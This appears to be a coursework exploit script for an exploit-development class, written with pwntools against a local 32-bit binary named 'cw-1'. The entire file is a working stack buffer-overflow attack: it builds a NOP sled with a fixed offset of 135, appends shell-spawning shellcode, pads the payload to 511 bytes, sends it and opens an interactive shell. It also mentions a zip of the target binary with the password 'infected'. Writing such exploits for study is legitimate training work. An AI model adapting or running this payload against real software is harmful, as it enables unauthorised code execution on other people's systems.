#!/bin/python3
from pwn import *

context(arch='i386', os='linux')  # this is determining the 32 bit linux system

# Starting the assignment's execution process of the executable file
cw = process('./cw-1')

# Shellcode to get a shell which is payload for exploit
shellcode = asm(shellcraft.sh())

# Defining the obtained offset using the cyclic_find or pattern methods
offset = 135

# the requirement of the return address was not so much required for this exploit.

# Constructing the payload with all things that were obtained.
payload = b""
payload += b"\x90" * offset  # NOP hex value for the proper alignment of the payload
payload += shellcode
payload += b"\x90" * (511 - len(payload))

# Sending the payload
cw.sendline(payload)
cw.interactive()

# Payload for coursework 1 of Exploit Developemnt Written by Rohan Thapa.
# the zip does contain the linux executable as the password for it is `infected`